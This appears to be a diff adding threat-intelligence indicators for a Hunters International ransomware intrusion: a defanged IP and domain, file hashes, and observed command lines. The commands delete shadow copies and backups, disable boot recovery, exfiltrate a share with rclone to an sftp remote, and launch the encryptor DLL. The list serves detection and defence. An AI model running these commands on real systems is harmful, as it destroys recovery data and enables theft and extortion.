@@ -1,0 +1,28 @@
+IP:
+
+192.155.106[.]11
+
+Domain:
+
+winscp[.]net
+
+File:
+
+7ee1fd53457c9a73308ae98c01722aa2b9170ef1 - encrypter_windows_x64.dll (Hunters International Ransomware)
+b5d2e0fbd6cd0f6a679fbf95e588c6a2dfd4d5dd - encrypter_windows_x64.exe (Hunters International Ransomware)
+d0c1662ce239e4d288048c0e3324ec52962f6ddda77da0cb7af9c1d9c2f1e2eb - port.exe (Advanced_Port_Scanner_2.5.3869.exe)
+07136cf4b61c53db7a802ff1e34d36b818ad077b - Rclone.exe
+26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b - Advanced_IP_Scanner_2.5.4594.1.exe
+63e86d50bd3e28b2f19d86114f589ff12c85cebba208e05ece896bcf4dce2aa2 - WinSCP-6.3.6-Setup.exe
+
+Command Line:
+
+"C:\\Windows\\System32\\bcdedit.exe" /set {default} recoveryenabled No
+"C:\\Windows\\System32\\bcdedit.exe" /set {default} bootstatuspolicy ignoreallfailures
+"C:\\Windows\\System32\\wbadmin.exe" delete systemstatebackup -keepVersions:3
+"C:\\Windows\\System32\\vssadmin.exe" delete shadows /all /quiet
+"C:\\Windows\\System32\\wbem\\WMIC.exe" shadowcopy delete
+"C:\\Windows\\System32\\wbadmin.exe" delete systemstatebackup
+"C:\\Windows\\System32\\wbadmin.exe" delete catalog-quiet
+rclone.exe copy \SHARE\D$\FOLDER sftp:DOMAIN\SHARE\FOLDER -q --max-age 5y --ignore-existing --auto-confirm --multi-thread-streams 4 --transfers 6 --bwlimit 200M --exclude *.exe --exclude *.msi --exclude *.MSI --exclude *.mp3 --exclude *.MP3 --exclude *.EXE --exclude *.avi --exclude *.mp4 --exclude *.MP4 --exclude *.AVI --exclude *.mov --exclude *.MOV --exclude *.iso --exclude *.ISO --exclude *.VHDX -P 
+rundll32.exe C:\Users\User\AppData\Local\Temp\encrypter_windows_x64.dll, Open --admin DOMAIN\Administrator:<ADMIN PASSWORD> -k agntsvc backup dbeng50 dbsnmp encsvc excel firefox infopath isqlplussvc memtas mepocs msaccess msexchange msmq mspub mssql mydesktopqos mydesktopservice mysql notepad ocautoupds ocomm ocssd onenote oracle outlook powerpnt sap sqbcoreservice sql steam svc$ synctime tbirdconfig thebat thunderbird veeam visio vmm vmms vmwp vss winword wordpad xfssvccon 
